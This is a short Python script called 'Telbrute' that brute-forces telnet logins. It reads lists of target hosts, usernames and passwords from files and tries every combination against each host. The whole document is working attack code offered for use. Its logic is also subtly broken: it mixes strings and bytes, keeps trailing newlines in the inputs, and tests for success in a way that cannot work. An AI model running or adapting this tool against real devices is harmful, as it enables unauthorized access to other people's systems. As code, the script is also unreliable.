import getpass
import sys
import telnetlib
import time
#import argparse

#parser = argparse.ArgumentParser()
#parser.add_argument("-v", help="Verbosity", action="store_true")
#args = parser.parse_args()

noTargets = 0
noUsers = 0
noPwds = 0
win = 0
hosts = []
users = []
passwords = []
result = [b'Login: ', b'Telnetd: Authorized login successful']




print("Starting Telbrute...")
#if args.v:
	#print("Reading Targets...")

#Reading all input data:
with open("data/targets.txt") as trgs:
	for trg in trgs:
		noTargets = noTargets + 1
		hosts.append(trg)

with open("data/users.txt") as usrs:
	for usr in usrs:
		noUsers = noUsers + 1
		users.append(usr)

with open("data/passwords.txt") as pwds:
	for pwd in pwds:
		noPwds = noPwds + 1
		passwords.append(pwd)


#Login start:
for host in hosts:
	for user in users:
		for password in passwords:
			tn = telnetlib.Telnet(host)
			tn.read_until("Login: ")
			time.sleep(2)
			print("Testing user: " + user)
			tn.write(user + "\n")
			tn.read_until("Password: ")
			print("Testing password: " + password)
			tn.write(password + "\n")
			if tn.read_until(">",2) is None:
				print("WIN!")
				break
			else:
				print("Login Failed")
			tn.close()
				